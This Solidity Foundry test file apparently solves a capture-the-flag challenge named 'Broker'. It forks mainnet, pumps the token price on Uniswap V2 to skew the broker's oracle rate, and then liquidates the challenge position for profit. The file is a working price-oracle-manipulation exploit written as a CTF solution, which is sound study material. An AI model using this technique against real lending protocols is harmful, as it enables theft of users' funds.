// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/broker/public/contracts/Setup.sol";

contract BrokerTest is Test {
    Setup setup;
    Broker broker;
    IUniswapV2Pair uniPool;
    IUniswapV2Router02 router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    WETH9 weth;
    ERC20Like token;

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_HTTPS_URL"), 17451027);
        setup = new Setup{value: 50 ether}();
        broker = setup.broker();
        uniPool = broker.pair();
        weth = broker.weth();
        token = broker.token();
    }

    function testManipulateBroker() public {
        address[] memory tokenPath = new address[](2);
        tokenPath[0] = address(weth);
        tokenPath[1] = address(token);

        address attacker = address(0xABCD);

        startHoax(attacker, 15 ether);

        // 1st Increase token price
        token.approve(address(uniPool), type(uint256).max);
        console.log("rate before is", broker.rate());
        router.swapExactETHForTokens{value: 15 ether}(0, tokenPath, address(attacker), block.timestamp);
        console.log("rate after is", broker.rate());

        // Liquidate the position
        balances(attacker);
        token.approve(address(broker), type(uint256).max);
        broker.liquidate(address(setup), token.balanceOf(address(attacker)));
        weth.withdraw(weth.balanceOf(attacker));
        balances(attacker);

        assertTrue(setup.isSolved());
    }

    function balances(address user) internal {
        console.log("balance of token: ", token.balanceOf(user) / 1e18);
        console.log("balance of ETH: ", user.balance / 1e18);
    }
}

interface IUniswapV2Router02 {
    function swapExactETHForTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline)
        external
        payable
        returns (uint256[] memory amounts);
}
